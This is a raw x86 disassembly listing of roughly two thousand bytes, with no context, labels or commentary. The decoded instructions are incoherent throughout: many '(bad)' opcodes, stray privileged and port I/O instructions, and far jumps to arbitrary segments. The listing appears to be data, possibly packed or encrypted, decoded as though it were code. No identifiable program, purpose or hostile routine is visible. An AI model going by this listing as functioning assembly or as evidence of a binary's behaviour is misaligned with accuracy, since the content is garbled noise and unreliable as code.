  411102:	mov    dl,0x91
  411104:	or     ah,BYTE PTR [edi]
  411106:	sti    
  411107:	fs (bad) 
  411109:	es loopne 0x411114
  41110c:	repnz imul esp,DWORD PTR [esi-0x22b0772c],0xffffffce
  411114:	shl    dh,0x3f
  411117:	ret    
  411118:	cmc    
  411119:	push   ebp
  41111a:	push   DWORD PTR [edx+0x5f]
  41111d:	push   ss
  41111e:	push   ss
  41111f:	mov    cl,0x65
  411121:	jle    0x411169
  411123:	xchg   ebx,eax
  411124:	int3   
  411125:	push   edi
  411126:	test   ch,0xad
  411129:	xchg   edx,eax
  41112a:	mov    ch,BYTE PTR [ebp-0x8]
  41112d:	push   0x69501111
  411132:	aad    0x60
  411134:	lods   al,BYTE PTR ds:[esi]
  411135:	cmp    al,0x15
  411137:	lods   al,BYTE PTR ds:[esi]
  411138:	lods   eax,DWORD PTR ds:[esi]
  411139:	outs   dx,BYTE PTR es:[esi]
  41113b:	sahf   
  41113c:	es test cl,al
  41113f:	push   esi
  411140:	pop    ss
  411141:	fcmove st,st(3)
  411143:	bound  edi,QWORD PTR [eax+0xa572516]
  411149:	add    DWORD PTR [ebp-0x15],0x1b7464a0
  411150:	adc    edi,DWORD PTR [eax]
  411152:	ror    dl,cl
  411154:	or     DWORD PTR [ebp-0x1851f6fb],0xffffffc9
  41115b:	repz jmp 0xdd6d6f11
  411161:	(bad)  
  411162:	and    DWORD PTR [ebp+0xddb0058],edx
  411168:	sbb    al,0xab
  41116a:	frstor [edi+ecx*2-0x4]
  41116e:	out    0xcb,eax
  411170:	jp     0x4111d1
  411172:	jmp    0xb5059992
  411177:	mov    al,0x39
  411179:	and    eax,0x26ba19ba
  41117e:	jp     0x41119e
  411180:	out    dx,eax
  411181:	xlat   BYTE PTR ds:[ebx]
  411182:	fidiv  DWORD PTR [esi]
  411184:	not    BYTE PTR [edi+0x25]
  411187:	cmp    DWORD PTR [ecx],ecx
  411189:	(bad)  
  41118a:	stc    
  41118b:	sub    esi,0x3a24e75d
  411191:	aaa    
  411192:	mov    bh,BYTE PTR [edx+0x116da208]
  411198:	or     ecx,edi
  41119a:	and    DWORD PTR [ebx],esp
  41119c:	cld    
  41119d:	mov    ch,0x12
  41119f:	push   0xc9cf9050
  4111a4:	iret   
  4111a5:	rcl    BYTE PTR [esi-0x5c],0x83
  4111a9:	xchg   esi,eax
  4111aa:	jg     0x4111dd
  4111ac:	xchg   DWORD PTR [ecx],ebp
  4111ae:	inc    eax
  4111af:	xlat   BYTE PTR ds:[ebx]
  4111b0:	idiv   DWORD PTR [edx+0x1ba81f68]
  4111b6:	inc    esi
  4111b7:	enter  0x9b5a,0xbf
  4111bb:	or     al,0x30
  4111bd:	scas   eax,DWORD PTR es:[edi]
  4111be:	cwde   
  4111bf:	sti    
  4111c0:	mov    edx,0xf48e22fd
  4111c5:	push   ds
  4111c6:	cdq    
  4111c7:	adc    esp,DWORD PTR [ecx-0x7]
  4111ca:	dec    ebp
  4111cb:	pop    eax
  4111cc:	mov    eax,ds:0x93a71dfc
  4111d1:	scas   al,BYTE PTR es:[edi]
  4111d2:	sti    
  4111d3:	fistp  WORD PTR ds:0xb476383c
  4111d9:	jb     0x411178
  4111db:	(bad)  
  4111dc:	push   esi
  4111dd:	data16 stos BYTE PTR es:[edi],al
  4111df:	fild   QWORD PTR [ebx+0x19]
  4111e2:	jo     0x4111b3
  4111e4:	loop   0x411178
  4111e6:	mov    bh,0x57
  4111e8:	push   0xbdce5e13
  4111ed:	nop
  4111ee:	inc    ebx
  4111ef:	repnz mov bl,0xcd
  4111f2:	cmp    al,0xd
  4111f4:	cli    
  4111f5:	call   0xf99bcf2d
  4111fa:	lods   eax,DWORD PTR ds:[esi]
  4111fb:	push   ds
  4111fc:	ret    0xa9dc
  4111ff:	mov    dh,al
  411201:	sbb    eax,0x810d05fe
  411206:	retf   
  411207:	lods   eax,DWORD PTR ds:[esi]
  411208:	test   BYTE PTR [edi],0x24
  41120b:	add    al,0x36
  41120d:	xor    BYTE PTR [edi+0x66f7eb82],ah
  411213:	add    eax,0x226c53df
  411218:	push   eax
  411219:	jb     0x4111b0
  41121b:	cmc    
  41121c:	retf   
  41121d:	ret    
  41121e:	mov    ?,WORD PTR [esi+0x2cdc013f]
  411224:	jne    0x4111b3
  411226:	mov    cl,0x4b
  411228:	daa    
  411229:	pop    es
  41122a:	sub    eax,0x408e8f3e
  41122f:	xor    al,0x63
  411231:	inc    edx
  411232:	in     al,dx
  411233:	stos   DWORD PTR es:[edi],eax
  411234:	pop    es
  411235:	xchg   esi,eax
  411236:	inc    BYTE PTR [eax+0x5401ccdd]
  41123c:	xor    DWORD PTR [esi+eiz*2-0x32],eax
  411240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411241:	cmp    al,0xab
  411243:	adc    ch,BYTE PTR [edi-0x5]
  411246:	rcr    BYTE PTR [ecx+0x69],1
  411249:	inc    edx
  41124a:	push   es
  41124b:	push   0x61
  41124d:	pop    edi
  41124e:	add    ah,BYTE PTR [ebp-0x76]
  411251:	push   0x8e30a45f
  411256:	sub    bh,cl
  411258:	pop    ecx
  411259:	jne    0x41125f
  41125b:	and    DWORD PTR [edx+0x2e],0x0
  41125f:	dec    esi
  411260:	xchg   BYTE PTR [ebx+0x6f2ae680],al
  411266:	jmp    0x411209
  411268:	or     eax,0xe145d5f
  41126d:	jo     0x411234
  41126f:	and    al,0xd2
  411271:	sahf   
  411272:	std    
  411273:	cld    
  411274:	loopne 0x411210
  411276:	mov    dh,0x3c
  411278:	push   edx
  411279:	mov    edi,ebx
  41127b:	sbb    eax,0xbaf889ea
  411280:	jnp    0x4112c3
  411282:	sub    DWORD PTR [ebp+0x7f],eax
  411285:	mov    fs,WORD PTR [esi+0x67a97e6c]
  41128b:	cmp    eax,0x8dfec358
  411290:	jmp    0x6272:0x644bdf3b
  411297:	jg     0x4112a0
  411299:	xchg   esi,eax
  41129a:	in     eax,0x21
  41129c:	mov    esi,0xd797bb8a
  4112a1:	adc    DWORD PTR [ecx],ecx
  4112a3:	jae    0x41127c
  4112a5:	mov    dl,0x2d
  4112a7:	or     dl,dl
  4112a9:	mov    ds:0xebd132a0,al
  4112ae:	ds inc edi
  4112b0:	cmp    al,BYTE PTR [esi-0x6c530f4e]
  4112b6:	int3   
  4112b7:	cli    
  4112b8:	dec    eax
  4112b9:	sub    al,BYTE PTR [eax]
  4112bb:	test   al,0x55
  4112bd:	stos   BYTE PTR es:[edi],al
  4112be:	mov    edi,0xa36973
  4112c3:	aam    0x9c
  4112c5:	(bad)  
  4112c6:	repnz loope 0x41127d
  4112c9:	loopne 0x41129e
  4112cb:	es (bad) 
  4112cd:	aam    0xb7
  4112cf:	loop   0x411313
  4112d1:	test   BYTE PTR [ebp-0x59],0xf5
  4112d5:	sbb    eax,0xc6e1887a
  4112da:	push   eax
  4112db:	inc    edx
  4112dc:	pusha  
  4112dd:	cmc    
  4112de:	add    al,0x12
  4112e0:	gs nop
  4112e2:	(bad)  
  4112e3:	mov    ebp,edx
  4112e5:	mov    ds:0x7d73f015,al
  4112ea:	xlat   BYTE PTR ds:[ebx]
  4112eb:	scas   eax,DWORD PTR es:[edi]
  4112ec:	rcl    DWORD PTR [edi],1
  4112ee:	test   eax,0x5fba946f
  4112f3:	push   edx
  4112f4:	pop    edx
  4112f5:	jno    0x4112aa
  4112f7:	cld    
  4112f8:	sar    DWORD PTR [esi-0x7c],0x1c
  4112fc:	dec    esp
  4112fd:	push   edi
  4112fe:	pop    ds
  4112ff:	mov    cl,0x2e
  411301:	adc    dl,bh
  411303:	ss call 0x6eb2c667
  411309:	stc    
  41130a:	sbb    DWORD PTR [edx+0x66707255],eax
  411310:	(bad)  
  411311:	push   0x9611e366
  411316:	inc    edi
  411317:	push   esi
  411318:	jno    0x411309
  41131a:	adc    dl,BYTE PTR [edi]
  41131c:	push   eax
  41131d:	adc    BYTE PTR [ecx],bh
  41131f:	cmp    al,0x52
  411321:	outs   dx,DWORD PTR ds:[esi]
  411322:	int3   
  411323:	jne    0x411346
  411325:	sub    al,bh
  411327:	out    dx,al
  411328:	jmp    DWORD PTR [edx]
  41132a:	mov    WORD PTR [eax],cs
  41132c:	xor    bh,dl
  41132e:	ror    BYTE PTR [eax-0x5d],0xaa
  411332:	mov    eax,ds:0x83a4b00e
  411337:	and    bh,BYTE PTR [ebx+0x65]
  41133a:	dec    esi
  41133b:	xchg   esp,eax
  41133c:	dec    ebp
  41133d:	sbb    bl,0x48
  411340:	xchg   DWORD PTR [ebx+ebp*8+0x5f],esi
  411344:	xor    edi,DWORD PTR [edi-0x1a957f2f]
  41134a:	out    0x61,al
  41134c:	mov    ebp,gs
  41134e:	sbb    DWORD PTR [ebx+0x1c],ebp
  411351:	pop    ebx
  411352:	push   cs
  411353:	retf   0x8590
  411356:	sub    dh,BYTE PTR [edi-0x1]
  411359:	imul   edx,DWORD PTR [eax],0xe4632273
  41135f:	cmc    
  411360:	xchg   BYTE PTR [edi+0x2d3dda88],ah
  411366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411367:	rol    DWORD PTR [ebp-0x2d],0x9
  41136b:	fld    DWORD PTR [edx]
  41136d:	mov    bh,0xf2
  41136f:	sti    
  411370:	lods   eax,DWORD PTR ds:[esi]
  411371:	loopne 0x411318
  411373:	mov    al,ds:0x17ab05d6
  411378:	stos   BYTE PTR es:[edi],al
  411379:	push   0x5bcd3931
  41137e:	mov    ebx,0x72d571b
  411383:	xchg   ebp,eax
  411384:	cmp    eax,0xcad015ec
  411389:	xor    BYTE PTR [edx],bl
  41138b:	mov    edi,DWORD PTR [edi-0x770bd0d]
  411391:	push   edx
  411392:	test   DWORD PTR [eax],ebp
  411394:	mov    cl,0x78
  411396:	call   0xdd81:0x1d16ff0a
  41139d:	mov    bl,0x5e
  41139f:	pop    esi
  4113a0:	jmp    0x2a226b8d
  4113a5:	cdq    
  4113a6:	gs push ecx
  4113a8:	mov    ebp,0x873c216e
  4113ad:	mov    eax,ds:0xab390efc
  4113b2:	inc    edx
  4113b3:	call   0xe1eadbe3
  4113b8:	jp     0x4113d5
  4113ba:	push   edi
  4113bb:	out    0x63,al
  4113bd:	cli    
  4113be:	inc    ebp
  4113bf:	lock xchg ebp,eax
  4113c1:	(bad)  
  4113c2:	lods   al,BYTE PTR ds:[esi]
  4113c3:	pop    ebp
  4113c4:	js     0x41135e
  4113c6:	aas    
  4113c7:	sub    BYTE PTR [esi],bl
  4113c9:	lea    esp,[edx-0x24]
  4113cc:	mov    edx,DWORD PTR [ecx]
  4113ce:	or     ebp,DWORD PTR [ecx+0x1502f79b]
  4113d4:	dec    ecx
  4113d5:	test   eax,0x9c08fb06
  4113da:	push   ds
  4113db:	jb     0x411374
  4113dd:	(bad)  
  4113de:	mov    BYTE PTR [ebp+0x8b1f8d4],ch
  4113e4:	xor    eax,0xb8ae3ff1
  4113e9:	jnp    0x411456
  4113eb:	icebp  
  4113ec:	test   edx,0x1dda53f0
  4113f2:	xchg   BYTE PTR [ecx],bh
  4113f4:	in     eax,dx
  4113f5:	inc    esp
  4113f6:	iret   
  4113f7:	adc    ebp,0x46f8bcb3
  4113fd:	adc    al,0xc4
  4113ff:	add    DWORD PTR [esi-0x2],ebp
  411402:	loop   0x411387
  411404:	jle    0x41139c
  411406:	sbb    edi,esp
  411408:	mov    ch,BYTE PTR [esi-0x80]
  41140b:	sub    al,0xfb
  41140d:	push   0x61be11b5
  411412:	outs   dx,DWORD PTR ds:[esi]
  411413:	loope  0x411452
  411415:	push   ebx
  411416:	out    0x5a,eax
  411418:	push   esi
  411419:	push   ebp
  41141a:	push   cs
  41141b:	addr16 sbb eax,0x412697e6
  411421:	xor    DWORD PTR [ecx+edi*1+0x1f],esi
  411425:	and    eax,0x306634ed
  41142a:	add    DWORD PTR [edx],ebp
  41142c:	lods   al,BYTE PTR ds:[esi]
  41142d:	mov    eax,0xc80eca73
  411432:	xchg   ecx,eax
  411433:	mov    ebx,0x9ee863da
  411438:	sub    DWORD PTR [ecx+0x61a553b7],esi
  41143e:	jmp    0x283f:0x112b7c3a
  411445:	clc    
  411446:	outs   dx,DWORD PTR ds:[esi]
  411447:	xor    BYTE PTR [edi+0x1e],0xcb
  41144b:	arpl   WORD PTR [edx],si
  41144d:	add    BYTE PTR [ebx],0x3c
  411450:	jo     0x411442
  411452:	stos   BYTE PTR es:[edi],al
  411453:	mov    esp,DWORD PTR fs:[edi+eiz*1+0xd]
  411458:	fimul  WORD PTR [ecx-0x4408b9a7]
  41145e:	mov    ch,BYTE PTR [edi]
  411460:	jmp    0x411439
  411462:	inc    ebx
  411463:	and    ebp,DWORD PTR [ebp-0x283be331]
  411469:	gs cwde 
  41146b:	inc    ebx
  41146c:	icebp  
  41146d:	clc    
  41146e:	mov    BYTE PTR [edx],cl
  411470:	xchg   ebx,eax
  411471:	call   0x5b1f26a9
  411476:	mov    WORD PTR [edi+ecx*1],gs
  411479:	jg     0x4114af
  41147b:	ja     0x41141f
  41147d:	push   0x42
  41147f:	aam    0xa9
  411481:	sbb    BYTE PTR [eax+0x5b],0xbe
  411485:	sub    al,0x95
  411487:	test   DWORD PTR [edx-0x186b4e89],ebp
  41148d:	jae    0x4114dd
  41148f:	push   ss
  411490:	sti    
  411491:	dec    esp
  411492:	xor    al,0xc8
  411494:	jae    0x4114da
  411496:	adc    DWORD PTR [edx-0x271848da],esp
  41149c:	fsubrp st(7),st
  41149e:	popf   
  41149f:	xor    bh,BYTE PTR [ecx+edi*8]
  4114a2:	pop    ebx
  4114a3:	test   DWORD PTR [ecx-0x13],esp
  4114a6:	xchg   ebx,eax
  4114a7:	mov    eax,ds:0xa5b0b03c
  4114ac:	inc    esi
  4114ad:	paddsb mm0,QWORD PTR [ecx+0x5e34d5d5]
  4114b4:	cmp    ebp,DWORD PTR [esp+ebp*8-0x1b]
  4114b8:	outs   dx,DWORD PTR ds:[esi]
  4114b9:	push   ds
  4114ba:	mov    al,0xa
  4114bc:	ret    0x39d5
  4114bf:	sub    al,0xa9
  4114c1:	mov    ebp,0x443b8527
  4114c6:	int    0x25
  4114c8:	std    
  4114c9:	add    ebp,DWORD PTR [eax-0x7b]
  4114cc:	dec    ebx
  4114cd:	push   ds
  4114ce:	jns    0x4114e3
  4114d0:	jmp    0xa43c1f17
  4114d5:	mov    dh,0xe4
  4114d7:	sar    DWORD PTR [esi-0x5a],cl
  4114da:	repz pop edi
  4114dc:	aas    
  4114dd:	popa   
  4114de:	or     DWORD PTR [ebp+0x5e],0xe11dbc9b
  4114e5:	dec    edx
  4114e6:	and    al,0xae
  4114e8:	mov    dl,ah
  4114ea:	call   DWORD PTR [ebx-0x4d]
  4114ed:	xor    DWORD PTR [edx],ebx
  4114ef:	inc    ebx
  4114f0:	stos   BYTE PTR es:[edi],al
  4114f1:	out    dx,al
  4114f2:	loope  0x41155f
  4114f4:	push   0x277d9bb3
  4114f9:	sub    BYTE PTR [edx+0x54c27c4c],dl
  4114ff:	sbb    cl,BYTE PTR [ecx]
  411501:	gs addr16 (bad) 
  411504:	jl     0x411486
  411506:	(bad)  
  411507:	push   0x3db62b27
  41150c:	stos   DWORD PTR es:[edi],eax
  41150d:	ins    DWORD PTR es:[edi],dx
  41150e:	add    dh,bl
  411510:	inc    edx
  411512:	sbb    BYTE PTR [edx-0x7b],0xf9
  411516:	shl    BYTE PTR [edx],0xd
  411519:	call   0xeaa6403b
  41151e:	cmp    DWORD PTR [ebx-0x65],edi
  411521:	loop   0x41154d
  411523:	stos   BYTE PTR es:[edi],al
  411524:	or     ebx,ebx
  411526:	pop    eax
  411527:	push   edx
  411528:	add    dh,BYTE PTR [ebp-0x48]
  41152b:	cmp    BYTE PTR [edx-0xd],bl
  41152e:	pop    esp
  41152f:	jnp    0x4114c8
  411531:	imul   ecx,DWORD PTR [esi],0x3b
  411534:	popa   
  411535:	in     al,0xee
  411537:	push   cs
  411538:	stc    
  411539:	or     BYTE PTR [edi],0x86
  41153c:	and    ecx,ebx
  41153e:	popf   
  41153f:	test   bl,ch
  411541:	or     eax,0x53b64a26
  411546:	stos   BYTE PTR es:[edi],al
  411547:	pushf  
  411548:	sub    eax,0xf4bfcc89
  41154d:	cmp    dl,BYTE PTR [ecx]
  41154f:	nop
  411550:	sub    eax,0xcaafffbb
  411555:	fnstenv [ecx+0x6d3e5039]
  41155b:	dec    ecx
  41155c:	rcl    bh,1
  41155e:	repz push esi
  411560:	outs   dx,DWORD PTR ds:[esi]
  411561:	mov    al,ds:0x1b14c870
  411566:	xor    dl,ch
  411568:	cld    
  411569:	and    eax,0x9d8435cf
  41156e:	or     BYTE PTR [ecx],bh
  411570:	lods   eax,DWORD PTR ds:[esi]
  411571:	fidiv  DWORD PTR [ecx+0x1f8c8e82]
  411577:	add    eax,0x6cebd490
  41157c:	aaa    
  41157d:	push   cs
  41157e:	repnz add dl,dh
  411581:	jg     0x411554
  411583:	repz aaa 
  411585:	out    dx,eax
  411586:	dec    esp
  411587:	jne    0x4115a7
  411589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41158a:	jne    0x411571
  41158c:	psubq  mm6,QWORD PTR [ebx+0x56]
  411590:	fucom  st(1)
  411592:	dec    edi
  411593:	cmc    
  411594:	arpl   dx,bp
  411596:	and    eax,0xc532ec62
  41159b:	lea    esi,[ebp+0x12]
  41159e:	bound  ebx,QWORD PTR [esi-0x6]
  4115a1:	test   BYTE PTR [ebp+0xd786824],dh
  4115a7:	and    al,0xcb
  4115a9:	add    cl,BYTE PTR [ecx-0x6]
  4115ac:	pushf  
  4115ad:	in     eax,dx
  4115ae:	setbe  BYTE PTR [esi+ecx*2]
  4115b2:	sub    ebx,ebx
  4115b4:	or     al,al
  4115b6:	lahf   
  4115b7:	ins    DWORD PTR es:[edi],dx
  4115b8:	cmp    esp,DWORD PTR [edx]
  4115ba:	adc    edi,DWORD PTR [eax]
  4115bc:	dec    ebp
  4115bd:	jmp    0x4115a9
  4115bf:	jne    0x4115fe
  4115c1:	sbb    dh,BYTE PTR [eax-0x63c59ac0]
  4115c7:	cdq    
  4115c8:	mov    esi,0x72caef1d
  4115cd:	mov    dh,0x77
  4115cf:	inc    DWORD PTR [ebx-0x76]
  4115d2:	or     al,0x46
  4115d4:	mov    esp,0x63eb2cd2
  4115d9:	in     al,0x2a
  4115db:	in     al,dx
  4115dc:	push   es
  4115dd:	mov    ebx,DWORD PTR [ebp-0x44]
  4115e0:	dec    edi
  4115e1:	bound  esp,QWORD PTR [edi-0x50a77032]
  4115e7:	arpl   WORD PTR [edx+0x125badb8],dx
  4115ed:	test   al,0xe
  4115ef:	call   0x318c:0x3b82226e
  4115f6:	adc    edi,DWORD PTR [edi-0x73]
  4115f9:	pop    ds
  4115fa:	loope  0x41162d
  4115fc:	retf   
  4115fd:	add    al,0x86
  4115ff:	jmp    0xf2a1:0xd7953171
  411606:	cmp    esi,ebx
  411608:	in     eax,dx
  411609:	sub    al,0xd0
  41160b:	int3   
  41160c:	lods   al,BYTE PTR ds:[esi]
  41160d:	(bad)  
  41160e:	push   ebp
  41160f:	fmul   st,st(2)
  411611:	mov    ebp,0xc18324a2
  411616:	push   ecx
  411617:	mov    dh,0xfe
  411619:	jg     0x4115e9
  41161b:	sti    
  41161c:	pop    eax
  41161d:	fldcw  WORD PTR [ecx]
  41161f:	das    
  411620:	cmp    ah,BYTE PTR [ecx]
  411622:	out    0x77,al
  411624:	scas   al,BYTE PTR es:[edi]
  411625:	sub    DWORD PTR [eax],eax
  411627:	aas    
  411628:	xchg   ebx,eax
  411629:	rcl    BYTE PTR [ecx],1
  41162b:	jecxz  0x4115f7
  41162d:	rcr    eax,1
  41162f:	pop    ebx
  411630:	xchg   edi,eax
  411631:	xchg   esp,eax
  411632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411633:	jle    0x4115d3
  411635:	xlat   BYTE PTR ds:[ebx]
  411636:	mov    eax,ds:0x61dc7e6c
  41163b:	fild   DWORD PTR [eax]
  41163d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41163e:	push   ecx
  41163f:	aam    0xf2
  411641:	sub    BYTE PTR [ecx-0x73],0xc1
  411645:	pop    ebp
  411646:	inc    esp
  411647:	cmp    eax,0xd2863c39
  41164c:	jns    0x411609
  41164e:	mov    eax,0x3a120663
  411653:	inc    edi
  411654:	mov    esp,0x5cf4a8f0
  411659:	and    bh,BYTE PTR [eax+0x38]
  41165c:	push   edi
  41165d:	sbb    DWORD PTR [edx],0xf0412143
  411663:	sub    al,BYTE PTR [eax]
  411665:	jg     0x411688
  411667:	xchg   DWORD PTR [edx],ecx
  411669:	hlt    
  41166a:	cmp    eax,0x5aac52c
  41166f:	xor    cl,BYTE PTR [esi]
  411671:	in     al,dx
  411672:	sub    eax,0x12c0df89
  411677:	cmc    
  411678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411679:	cmp    DWORD PTR [ebx+eiz*1-0x47fafff0],eax
  411680:	lds    esi,FWORD PTR [ebx+0x57870e0b]
  411686:	fistp  DWORD PTR [eax]
  411688:	sub    eax,DWORD PTR [ebx+ebp*4+0x7ba313fb]
  41168f:	mov    DWORD PTR [edi],ebp
  411691:	mov    esp,0xd2a93fbb
  411696:	sbb    al,0xbd
  411698:	jmp    0x4f28be5f
  41169d:	push   es
  41169e:	dec    eax
  41169f:	fisttp DWORD PTR [ebp-0x24c404c7]
  4116a5:	cld    
  4116a6:	(bad)  
  4116a7:	pop    esi
  4116a8:	push   ds
  4116a9:	popf   
  4116aa:	shl    BYTE PTR [edx+0x1a],cl
  4116ad:	sbb    ebp,ebx
  4116af:	push   esp
  4116b0:	sbb    DWORD PTR [edi],eax
  4116b2:	aad    0x99
  4116b4:	rcl    BYTE PTR [edx+0x4f],0x71
  4116b8:	adc    eax,0xf49b977b
  4116bd:	cmp    eax,DWORD PTR [eax+esi*2+0x4d]
  4116c1:	push   ebx
  4116c2:	fild   WORD PTR [esi-0xa7b61e3]
  4116c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116c9:	imul   ebp,DWORD PTR [eax-0x64aebb46],0x5478ff54
  4116d3:	xor    esp,DWORD PTR [ecx+0x47954d6a]
  4116d9:	outs   dx,BYTE PTR ds:[esi]
  4116da:	inc    ecx
  4116db:	xchg   ecx,eax
  4116dc:	sub    eax,DWORD PTR [ecx+0x42]
  4116df:	jns    0x4116a4
  4116e1:	js     0x411668
  4116e3:	pop    edx
  4116e4:	stos   BYTE PTR es:[edi],al
  4116e5:	cmc    
  4116e6:	out    dx,al
  4116e7:	xor    ebx,ebp
  4116e9:	ins    DWORD PTR es:[edi],dx
  4116ea:	mov    ebx,0x9d51bcf8
  4116ef:	rcr    BYTE PTR [ecx+0x53],0xb5
  4116f3:	jmp    0xbbbd5931
  4116f8:	jl     0x411734
  4116fa:	xchg   esi,eax
  4116fb:	xor    eax,0x217a7bf
  411700:	jg     0x411718
  411702:	fdivr  DWORD PTR [ecx]
  411704:	cld    
  411705:	adc    cl,dl
  411707:	dec    eax
  411708:	or     esp,edi
  41170a:	aad    0xe
  41170c:	pop    ecx
  41170d:	test   edi,esi
  41170f:	js     0x411765
  411711:	or     al,BYTE PTR [ebp+0x31ced108]
  411717:	cmc    
  411718:	push   cs
  411719:	fld    QWORD PTR [edi-0x11]
  41171c:	mov    ch,0x54
  41171e:	cmp    esi,edx
  411720:	aam    0xda
  411722:	mov    eax,ds:0x7e76a453
  411727:	hlt    
  411728:	mov    ecx,0x254edcf
  41172d:	push   cs
  41172e:	adc    ch,dh
  411730:	mov    ecx,0x2d163089
  411735:	mov    dh,BYTE PTR [eax]
  411737:	aas    
  411738:	jb     0x4116fe
  41173a:	mov    al,0xf5
  41173c:	or     ebp,ebx
  41173e:	xlat   BYTE PTR ds:[ebx]
  41173f:	add    eax,0x3629b730
  411744:	test   ebp,0x44462cba
  41174a:	sub    ebx,DWORD PTR [ebp+0x5d]
  41174d:	lea    ecx,[edx+0x5e83d2b6]
  411753:	mov    esi,0x24b88596
  411758:	xor    cl,BYTE PTR [eax]
  41175a:	mov    esp,0xb0f119b1
  41175f:	idiv   DWORD PTR [ebx-0x5e]
  411762:	jmp    0x13a8:0xe2f59714
  411769:	stc    
  41176a:	or     bh,al
  41176c:	or     DWORD PTR [edx-0x609abc6a],edx
  411772:	pop    es
  411773:	dec    esp
  411774:	ror    BYTE PTR [eax-0x330940ab],1
  41177a:	clc    
  41177b:	jecxz  0x41172b
  41177d:	jmp    0xf1f8:0x3de0d902
  411784:	mov    DWORD PTR [ecx-0x7ab20754],esi
  41178a:	or     DWORD PTR [ebx+ecx*8-0x29],esp
  41178e:	or     BYTE PTR [ebx-0x60fb6c95],bh
  411794:	(bad)  
  411795:	icebp  
  411796:	jecxz  0x4117ee
  411798:	nop
  411799:	xor    BYTE PTR [ebx],cl
  41179b:	leave  
  41179c:	mov    BYTE PTR [esp+eax*4],cl
  41179f:	and    esi,DWORD PTR [esi-0x26]
  4117a2:	jmp    0x4117e2
  4117a4:	shl    BYTE PTR [edi],0x55
  4117a7:	out    dx,al
  4117a8:	(bad)  
  4117a9:	jnp    0x4117c5
  4117ab:	push   0x12282bb9
  4117b0:	or     bl,BYTE PTR [esi]
  4117b2:	test   al,0x99
  4117b4:	sbb    al,0x52
  4117b6:	out    0xd9,eax
  4117b8:	int    0x6f
  4117ba:	mov    edx,0xa0e3514a
  4117bf:	mov    edx,0xd9531bc2
  4117c4:	icebp  
  4117c5:	mov    ds:0x5bb73430,eax
  4117ca:	outs   dx,BYTE PTR ds:[esi]
  4117cb:	dec    ebx
  4117cc:	xor    DWORD PTR [edx-0xd1a6f31],0x95806bc1
  4117d6:	xor    ebp,DWORD PTR [ecx]
  4117d8:	scas   eax,DWORD PTR es:[edi]
  4117d9:	fs mov al,0xae
  4117dc:	ss ror esp,cl
  4117df:	dec    edx
  4117e0:	jns    0x4117e6
  4117e2:	data16 outs dx,BYTE PTR ds:[esi]
  4117e4:	jns    0x4117b6
  4117e6:	adc    eax,DWORD PTR [eax+ebp*1]
  4117e9:	mov    edi,0xc956429
  4117ee:	inc    esp
  4117ef:	sbb    eax,0x5d772d4d
  4117f4:	fs cli 
  4117f6:	cmp    esi,esp
  4117f8:	(bad)  
  4117f9:	jecxz  0x4117da
  4117fb:	es inc edx
  4117fd:	loope  0x41180d
  4117ff:	cwde   
  411800:	call   0x1cf985d2
  411805:	sar    ecx,1
  411807:	pushf  
  411808:	mov    ebx,0x2f73d4cc
  41180d:	fbld   TBYTE PTR [esi]
  41180f:	jg     0x4117df
  411811:	jns    0x411887
  411813:	fisttp QWORD PTR [ecx-0x20537746]
  411819:	xchg   esi,eax
  41181a:	mov    ecx,esi
  41181c:	jmp    0x4117cb
  41181e:	or     al,0x7
  411820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411821:	sub    BYTE PTR [edx+0x1445d3e9],al
  411827:	ja     0x4117d7
  411829:	or     BYTE PTR [edx+0x2],0xc9
  41182d:	add    eax,0x50becc3e
  411832:	dec    edi
  411833:	cli    
  411834:	fisttp WORD PTR [ebx+0x603737a1]
  41183a:	rcr    ebp,1
  41183c:	lods   al,BYTE PTR ds:[esi]
  41183d:	mov    ebp,0x6231082e
  411842:	sub    eax,0x8d8b740d
  411847:	push   ebp
  411848:	inc    esi
  411849:	enter  0xa1cf,0x28
  41184d:	jne    0x411824
  41184f:	or     BYTE PTR [ebx],ah
  411851:	push   ds
  411852:	mov    bh,0xb2
  411854:	adc    cl,BYTE PTR [ebx+edi*1+0x49]
  411858:	lahf   
  411859:	loopne 0x4118a4
  41185b:	iret   
  41185c:	dec    esp
  41185d:	std    
  41185e:	xchg   ecx,eax
  41185f:	cmp    DWORD PTR es:[ebx+0x11],esi
  411863:	mov    al,0x3f
  411865:	call   0x5bc6:0x75186cdc
  41186c:	push   es
  41186d:	cmp    al,BYTE PTR [ecx+0x2dfab878]
  411873:	mov    eax,0x44031ca4
  411878:	outs   dx,BYTE PTR ds:[esi]
  411879:	sub    bl,bh
  41187b:	pop    ecx
  41187c:	add    al,0x7e
  41187e:	iret   
  41187f:	mov    al,0xaf
  411881:	mov    ds:0xfa6bb529,al
  411886:	jmp    FWORD PTR [edx+0x5fe0548a]
  41188c:	mov    bh,0x24
  41188e:	out    dx,al
  41188f:	ror    BYTE PTR [eax],1
  411891:	add    ecx,ebx
  411893:	adc    bl,BYTE PTR [edx-0x1509921b]
  411899:	and    al,0x62
  41189b:	test   al,0x4d
  41189d:	fisttp WORD PTR [ecx]
  41189f:	arpl   WORD PTR [ecx-0xe2f3fde],dx
  4118a5:	out    dx,al
  4118a6:	and    dl,BYTE PTR [ecx+0x68648940]
  4118ac:	mov    ecx,0xbf61483
  4118b1:	and    BYTE PTR [ebp+edi*1+0x5e],bh
  4118b5:	jnp    0x4118f7
  4118b7:	popa   
  4118b8:	jmp    0x1cf0ac8b
  4118bd:	stc    
  4118be:	mov    esp,0xe582f350
  4118c3:	inc    ebp
  4118c4:	aad    0x75
  4118c6:	arpl   WORD PTR [esi],bp
  4118c8:	loope  0x41189e
  4118ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118cb:	sahf   
  4118cc:	mov    ebp,0xd4ba56ae
  4118d1:	(bad)  
  4118d2:	and    ch,ch
  4118d4:	xlat   BYTE PTR ds:[ebx]
  4118d5:	sti    
  4118d6:	mov    ebp,0x884bcdcb
  4118db:	adc    eax,0xa1cb0199
  4118e0:	mov    ds:0x35d81bcb,eax
  4118e5:	lds    ecx,FWORD PTR [edi]
  4118e7:	call   0xb79483ce
  4118ec:	sub    eax,0x25c1d63d
